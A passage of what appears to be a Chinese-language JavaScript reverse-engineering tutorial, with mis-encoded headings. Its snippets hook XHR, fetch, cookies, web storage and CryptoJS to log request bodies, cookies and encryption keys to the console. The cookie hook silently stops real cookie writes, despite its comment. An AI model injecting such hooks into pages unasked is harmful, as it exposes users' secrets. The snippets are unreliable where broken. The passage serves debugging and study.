<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">_method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">method</span><span class="p">;</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">url</span><span class="p">;</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[XHR] </span><span class="si">${</span><span class="nx">method</span><span class="si">}</span><span class="sb"> </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalOpen</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// Hook send</span>
<span class="w">    </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[XHR] Request body:`</span><span class="p">,</span><span class="w"> </span><span class="nx">body</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Hook å“åº”</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;readystatechange&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[XHR] Response:`</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSend</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="hook-fetch">Hook Fetch</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>

<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Fetch] Request:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Fetch] Response:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">response</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// Clone response to avoid consuming it</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">().</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">body</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Fetch] Response body:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">body</span><span class="p">);</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="é€šç”¨ç½‘ç»œè¯·æ±‚ç›‘æ§">é€šç”¨ç½‘ç»œè¯·æ±‚ç›‘æ§</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Hook XHR</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">XHR_open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">XHR_send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>

<span class="w">    </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">_requestInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">time</span><span class="o">:</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="p">};</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸŒ [XHR] </span><span class="si">${</span><span class="nx">method</span><span class="si">}</span><span class="sb"> </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">XHR_open</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">body</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“¤ [XHR] Body:`</span><span class="p">,</span><span class="w"> </span><span class="nx">body</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;load&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">duration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">_requestInfo</span><span class="p">.</span><span class="nx">time</span><span class="p">;</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“¥ [XHR] </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">status</span><span class="si">}</span><span class="sb"> </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">_requestInfo</span><span class="p">.</span><span class="nx">url</span><span class="si">}</span><span class="sb"> (</span><span class="si">${</span><span class="nx">duration</span><span class="si">}</span><span class="sb">ms)`</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“¥ [XHR] Response:`</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">200</span><span class="p">));</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">XHR_send</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// Hook Fetch</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">startTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸŒ [Fetch]`</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">]);</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="o">?</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“¤ [Fetch] Body:`</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">1</span><span class="p">].</span><span class="nx">body</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">duration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">startTime</span><span class="p">;</span>

<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“¥ [Fetch] </span><span class="si">${</span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="si">}</span><span class="sb"> (</span><span class="si">${</span><span class="nx">duration</span><span class="si">}</span><span class="sb">ms)`</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Clone to avoid consuming</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">clonedResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">clonedResponse</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“¥ [Fetch] Response:`</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">200</span><span class="p">));</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="cookie-hook">Cookie Hook</h2>

      <h3 id="ç›‘æ§-cookie-è¯»å†™">ç›‘æ§ Cookie è¯»å†™</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">cookieCache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>

<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;cookie&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸª [Cookie] Read:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">cookieCache</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">cookieCache</span><span class="p">;</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸª [Cookie] Write:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>

<span class="w">            </span><span class="c1">// å®é™…å†™å…¥ Cookie</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">cookieParts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">value</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">)[</span><span class="mf">0</span><span class="p">];</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="p">[</span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">val</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cookieParts</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// æ›´æ–°ç¼“å­˜</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">cookies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cookieCache</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;; &#39;</span><span class="p">);</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cookies</span><span class="p">.</span><span class="nx">findIndex</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="nx">key</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;=&#39;</span><span class="p">));</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">index</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="o">-</span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">cookies</span><span class="p">[</span><span class="nx">index</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cookieParts</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">cookies</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">cookieParts</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="nx">cookieCache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cookies</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;; &#39;</span><span class="p">);</span>

<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="storage-hook">Storage Hook</h2>

      <h3 id="hook-localstorage">Hook LocalStorage</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSetItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalGetItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalRemoveItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">;</span>

<span class="w">    </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ’¾ [LocalStorage] Set: </span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb"> = </span><span class="si">${</span><span class="nx">value</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSetItem</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalGetItem</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ’¾ [LocalStorage] Get: </span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb"> = </span><span class="si">${</span><span class="nx">value</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ’¾ [LocalStorage] Remove: </span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalRemoveItem</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="hook-sessionstorage">Hook SessionStorage</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŒ LocalStorageï¼Œå°† localStorage æ›¿æ¢ä¸º sessionStorage</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSetItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalGetItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">;</span>

<span class="w">    </span><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“¦ [SessionStorage] Set: </span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb"> = </span><span class="si">${</span><span class="nx">value</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSetItem</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalGetItem</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“¦ [SessionStorage] Get: </span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb"> = </span><span class="si">${</span><span class="nx">value</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="åŠ å¯†å‡½æ•°-hook">åŠ å¯†å‡½æ•° Hook</h2>

      <h3 id="hook-cryptojs">Hook CryptoJS</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">CryptoJS</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Hook MD5</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalMD5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">;</span>
<span class="w">        </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ” [CryptoJS.MD5] Input:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalMD5</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ” [CryptoJS.MD5] Output:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="k">debugger</span><span class="p">;</span><span class="w"> </span><span class="c1">// è‡ªåŠ¨æ–­ç‚¹</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="c1">// Hook AES.encrypt</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalAESEncrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">;</span>
<span class="w">        </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ” [CryptoJS.AES.encrypt]&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Message:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Key:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Config:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="p">);</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalAESEncrypt</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Result:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="c1">// Hook AES.decrypt</span>
